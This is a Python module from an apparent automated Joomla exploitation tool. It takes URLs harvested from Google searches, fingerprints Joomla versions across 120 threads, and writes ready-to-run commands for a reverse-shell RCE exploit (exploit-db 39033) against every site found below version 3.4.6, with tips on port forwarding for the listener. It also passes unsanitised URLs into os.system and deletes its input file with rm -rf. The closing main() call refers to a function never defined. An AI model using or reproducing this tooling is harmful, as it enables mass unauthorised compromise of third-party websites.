"""
Google Exploiter Parser Module.

This module is responsible for parsing the results from google,
for generic or a specific cve exploit.

Feel free to add any kind of parser to your exploit ;)
"""

import os
import sys
from bs4 import BeautifulSoup

from urllib.parse import urlparse

import requests
from requests import get
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from threading import Thread
import threading
from queue import Queue
import time


"""
Function to remove duplicate targets
"""
def remove_duplicate_targets(results):
    url_lists = []
    for url in results:
        try:
            urlp = urlparse(url)
            urlp = urlp.scheme+'://'+urlp.netloc
            url_lists.append(urlp)
        except:
            pass
    url_lists = set(url_lists)
    url_lists = list(url_lists)
    return url_lists

"""
Generic parser, only gets the url from results and save it to generic_results.txt
"""
def generic_parser(results):
    
    # Removing duplicate targets
    url_lists = remove_duplicate_targets(results)

    with open('generic_results.txt', 'a') as arq:
        for url in url_lists:
            try:
                arq.write(url+'\n')
            except:
                pass

"""
Joomla RCE 15/12/2015 Parser
exploit-db CVE: https://www.exploit-db.com/exploits/39033/

This parser will get the results from google search, and try to greb the joomla version from each url target.

If the joomla version is < then 3.4.6, the target will be separeted in a new file, with the command line to use the exploit. Ex:

python joomla-rce-2-shell.py -t http://www.target1.com.br -l <IP> -p <PORT>
python joomla-rce-2-shell.py -t http://www.target2.com.br -l <IP> -p <PORT>
...
...

**OBS: Remember to config port forward from your router to your local machine :D
"""
def version(version):
    return tuple(map(int, (version.split("."))))

lock = threading.Lock()
def check_vuln(q, revshell, port):
    while True:
        #with lock:
            url = q.get()        
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0'}
            joomver1 = '/language/en-GB/en-GB.xml'
            joomver2 = '/administrator/manifests/files/joomla.xml'
            joomla_version = '90.90.90'
            try:
                req = get(url, headers=headers, verify=False, timeout=10)
                # First attempt to get joomla version
                try:
                    req2 = get(req.url+joomver1, headers=headers)
                    soup = BeautifulSoup(req2.content, 'lxml')
                    joomla_version = soup.version.string

                    # Second attemtp to get joomla version
                    if joomla_version == '90.90.90':
                        req = get(req.url+joomver2, headers=headers)
                        soup = BeautifulSoup(req.content, 'lxml')
                        joomla_version = soup.version.string
                except:
                    # EXCEPT WHEN CAN'T GET THE JOOMLA VERSION
                    pass
            except:
                # ERROR WHEN CAN'T CONNECT TO TARGET
                print ('[-] Couldn\'t connect to target: '+url+'\n')
                pass
            # PARSING TARGETS THAT COULD GET THE JOOMLA! VERSION
            try:
                if version(joomla_version) < version('3.4.6'):
                    print ('[+] Target: '+req.url)
                    print ('[+] Possible vulnerable')
                    print ('[+] Joomla: '+joomla_version+'\n')
                    cmd = 'echo python2 joomla-rce-2-shell.py -t '+req.url+' -l '+revshell+' -p '+port+' >> joomlaRCE_targets.txt\n'
                    os.system(cmd)
            except:
                q.task_done()
                pass
            q.task_done()

def split_target_file(filename):
    lines = open(filename).readlines()
    limit = int(len(lines)/5)
    if len(lines) > 20:
        for i in range(4):
            lines = open(filename).readlines()
            new_file = filename+str(i+2)
            open(new_file,'a').writelines(lines[0:limit])
            open(filename,'w').writelines(lines[limit:])

def joomla_15_12_2015_rce(filename, revshell, port):
    os.system('clear')
    print ('[*] You choose use joomla RCE exploit..')
    print ('[*] Start checking if targets can be vulnerable...\n')

    # Converting file to list
    results = [line.rstrip('\n') for line in open(filename)]

    # Removing duplicate targets
    url_lists = remove_duplicate_targets(results)

    # My Queue
    q = Queue(maxsize=0)

    # Number of threads
    num_threads=120

    for url in url_lists:
        q.put(url)

    # My threads
    print ('[*] Starting evil threads =)...\n')
    for i in range(num_threads):
        worker = Thread(target=check_vuln, args=(q, revshell, port, ))
        worker.setDaemon(True)
        worker.start()

    q.join()

    # Split big file to small file if necessary
    split_target_file('joomlaRCE_targets.txt')

    # removing the results file
    cmd = "rm -rf {0}".format(filename)
    os.system(cmd)

if __name__ == '__main__':
    main()
